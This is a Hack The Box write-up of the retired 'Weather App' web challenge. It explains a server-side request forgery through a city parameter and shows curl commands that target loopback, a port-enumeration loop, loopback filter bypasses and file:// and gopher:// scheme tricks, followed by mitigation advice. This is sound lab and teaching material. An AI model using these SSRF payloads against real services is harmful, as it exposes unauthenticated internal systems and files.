---
challenge: Weather App
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, ssrf, internal-service, metadata]
---

# Weather App — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

An app that looks up weather by city. The backend **makes the HTTP request for you** and accepts user URLs: **SSRF**. Pointing it at `127.0.0.1` reaches an internal service that is not exposed and returns the flag.

## Brief

A form with a city field returning temperature and conditions. An internal service runs on the same host.

## Analysis

```bash
curl -s "http://<IP>:<port>/api/weather?city=Madrid"
```

The response is the provider's JSON. Test whether the parameter accepts a full URL:

```bash
curl -s "http://<IP>:<port>/api/weather?city=http://127.0.0.1:80/"
```

If the body changes when you target another port, the server is making the request. Internal enumeration:

```bash
for p in 80 3000 5000 8000 8080; do
  echo "== $p"; curl -s "http://<IP>:<port>/api/weather?city=http://127.0.0.1:$p/" | head -c 200; echo
done
```

## Exploitation

The internal service answers on a local port with an endpoint that hands over the flag (or an unauthenticated panel):

```bash
curl -s "http://<IP>:<port>/api/weather?city=http://127.0.0.1:<internal_port>/flag"
```

```text
HTB{<flag>}
```

If `127.0.0.1` is filtered, the usual alternatives are `localhost`, `0.0.0.0`, `[::1]` or a domain resolving to loopback.

## Pitfalls

- **Scheme filter**: try `file://` and `gopher://` to read files or talk to Redis.
- **Redirects**: a 302 to the internal target works if the client follows redirects.
- **Wrong port**: enumerate before assuming 80.

## Lessons

- A user-controlled URL on the server is SSRF, even when the parameter is called "city".
- Loopback and metadata are the first targets: internal services lack auth because "nobody sees them".
- Mitigation: domain allowlist, DNS resolution with private ranges blocked, and no redirect following.
